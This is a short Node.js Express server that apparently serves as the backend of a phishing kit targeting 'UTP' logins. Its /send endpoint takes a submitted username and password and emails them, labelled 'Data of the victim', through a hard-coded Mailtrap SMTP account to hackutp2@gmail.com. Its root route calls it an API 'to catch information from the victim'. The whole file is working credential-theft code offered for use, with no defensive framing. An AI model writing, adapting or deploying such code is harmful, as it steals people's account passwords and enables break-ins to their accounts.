import express from "express";
import bodyParser from "body-parser";
import nodemailer from "nodemailer";
import cors from "cors";

const app = express();

const PORT = process.env.PORT || 5000;

//Settings
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());

app.post("/send", (req, res) => {
  const { username, password } = req.body;
  const transporter = nodemailer.createTransport({
    host: "sandbox.smtp.mailtrap.io",
    port: 2525,
    auth: {
      user: "5c71651c850f92",
      pass: "9b7d141674a262",
    },
  });

  const mailOptions = {
    from: "hackutp2@gmail.com", 
    to: "hackutp2@gmail.com", 
    subject: "Hack UTP",
    text: `Data of the victim:\n\nUsername: ${username}\n\nContraseña: ${password}\nCancel the subject :v`,
  };

  
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("Error al enviar el correo electrónico.");
    } else {
      console.log("Email has sent: " + info.response);
      res.send("Email has sent successfully");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Servidor Express escuchando en el puerto ${PORT}`);
});

app.get("/", (req, res) => {
  res.send("Welcome to the API to catch information from the victim");
});
